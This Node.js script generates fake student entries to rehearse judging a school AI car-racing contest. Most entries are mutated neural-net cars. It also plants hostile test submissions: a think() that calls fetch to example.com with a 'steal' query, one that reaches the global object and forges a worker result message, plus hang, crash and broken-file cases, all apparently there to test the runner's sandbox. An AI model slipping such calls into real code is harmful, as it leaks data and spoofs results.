// Папка с выдуманными работами для репетиции финала.
//   node tools/make-demo-entries.mjs [сколько=300] [папка=demo-entries]
// Внутри: <ник>/car.json — как после `gh classroom clone` или tools/collect-entries.mjs.
// Есть всё, что бывает в жизни: одинаковые файлы, свой код, зависший код, битый файл, лишние JSON.
import { mkdirSync, writeFileSync, rmSync, readFileSync } from 'fs';
import { join } from 'path';
import { cloneBrain } from '../engine/brain.js';
import { mulberry32 } from '../engine/utils.js';

const count = +(process.argv[2] ?? 300);
const dir = process.argv[3] ?? 'demo-entries';
const bots = JSON.parse(readFileSync(new URL('./bots.json', import.meta.url), 'utf8'));
const thinkSource = readFileSync(new URL('../student/think.js', import.meta.url), 'utf8');
const rnd = mulberry32(2026);

const A = ['turbo', 'neo', 'red', 'fast', 'lazy', 'pixel', 'dark', 'happy', 'mad', 'tiny', 'mega', 'cool', 'silent', 'crazy', 'retro'];
const B = ['fox', 'coder', 'cat', 'driver', 'bot', 'moose', 'panda', 'wolf', 'duck', 'rider', 'dev', 'owl', 'tiger', 'yak', 'otter'];
const NAMES = ['Молния', 'Сквозняк', 'Ржавая пуля', 'Тапок', 'Ракета', 'Черепашка', 'Шустрик', 'Боливар', 'Комета', 'Жук', 'Торпеда', 'Пончик'];
const pick = (list) => list[Math.floor(rnd() * list.length)];

function mutated(brain, rate) {
  const b = cloneBrain(brain);
  for (const layer of b.layers) {
    layer.weights = layer.weights.map((row) => row.map((w) => (rnd() < rate ? w + (rnd() - 0.5) * 0.4 : w)));
    layer.biases = layer.biases.map((v) => (rnd() < rate ? v + (rnd() - 0.5) * 0.4 : v));
  }
  return b;
}

const carFile = (bot, extra = {}) => ({
  format: 'ai-race/car@1',
  name: `${pick(NAMES)} ${Math.floor(rnd() * 90) + 10}`,
  color: `#${Math.floor(rnd() * 0xffffff).toString(16).padStart(6, '0')}`,
  think: bot.think,
  sensors: bot.sensors,
  layers: bot.layers,
  brain: mutated(bot.brain, 0.15),
  ...extra,
});

const avatar = (hue) => `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><circle cx="16" cy="16" r="15" fill="hsl(${hue} 80% 55%)"/><circle cx="11" cy="13" r="3" fill="#111"/><circle cx="21" cy="13" r="3" fill="#111"/><path d="M9 21q7 6 14 0" stroke="#111" stroke-width="2.5" fill="none"/></svg>`;

rmSync(dir, { recursive: true, force: true });
const used = new Set();
const shared = carFile(bots[1]); // этот файл «разошёлся по рукам»
for (let i = 0; i < count; i++) {
  let nick;
  do nick = `${pick(A)}-${pick(B)}${rnd() < 0.5 ? Math.floor(rnd() * 99) : ''}`; while (used.has(nick));
  used.add(nick);
  let file = carFile(bots[i % bots.length]);
  if (i % 25 === 3) file = { ...shared, name: `${pick(NAMES)} (копия)` };
  if (i % 7 === 0) file.avatar = avatar(Math.floor(rnd() * 360));
  if (i === 5) file = { ...file, think: 'mine', thinkSource: thinkSource.replace('(sum > bias ? 1 : 0)', '(sum > bias * 0.9 ? 1 : 0)') };
  if (i === 6) file = { ...file, think: 'mine', thinkSource: 'export const thinkVariants = { mine: { think() { while (true) {} } } };' };
  if (i === 7) file = { ...file, think: 'mine', thinkSource: 'export const thinkVariants = { mine: { think(inputs) { return inputs.nope.length; } } };' };
  if (i === 8) file = { ...file, think: 'mine', thinkSource: 'export const thinkVariants = { mine: { think() { fetch("https://example.com/?steal"); return [1, 0, 0, 0]; } } };' };
  if (i === 9) file = { ...file, think: 'mine', thinkSource: 'export const thinkVariants = { mine: { think() { return [Math.random(), 0, Math.random(), Math.random()]; } } };' };
  if (i === 10) file = { ...file, think: 'mine', thinkSource: 'export const thinkVariants = { mine: { think() { const g = (() => {}).constructor("return this")(); g.postMessage({ jobId: 0, result: null }); return [1, 0, 0, 0]; } } };' };
  const folder = join(dir, `ai-race-final-${nick}`);
  mkdirSync(folder, { recursive: true });
  writeFileSync(join(folder, 'car.json'), JSON.stringify(file));
  if (i % 10 === 0) writeFileSync(join(folder, 'package.json'), '{"name":"not-a-car"}');
  if (i === 11) writeFileSync(join(folder, 'car.json'), '{"format":"ai-race/car@1","name":"Сломанный","brain":{}}');
}
console.log(`${count} работ → ${dir}/`);
